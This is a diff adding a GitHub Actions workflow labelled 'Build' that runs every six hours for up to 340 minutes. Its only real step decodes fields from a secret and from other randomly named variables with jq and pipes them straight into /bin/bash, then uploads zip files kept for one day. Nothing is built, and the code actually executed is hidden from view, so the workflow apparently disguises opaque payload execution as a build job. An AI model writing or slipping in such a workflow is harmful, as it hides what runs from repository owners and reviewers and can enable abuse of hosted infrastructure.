@@ -1,0 +1,30 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '42 4,10,16,22 * * *'
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 340
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          bctr3: ${{ secrets.bctr3 }}
+        run: |
+          printf '%s' "$bctr3" | jq -r .g3932 | /bin/bash
+          printf '%s' "$rqqfp896" | jq -r .b7907 | /bin/bash
+          echo $kuwtc868 | jq -r .tsc5585 | /bin/bash
+          printf '%s' "$piuru352" | jq -r .gxsk3105 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: U0OJ2o93
+          path: "*.zip"
+          retention-days: 1
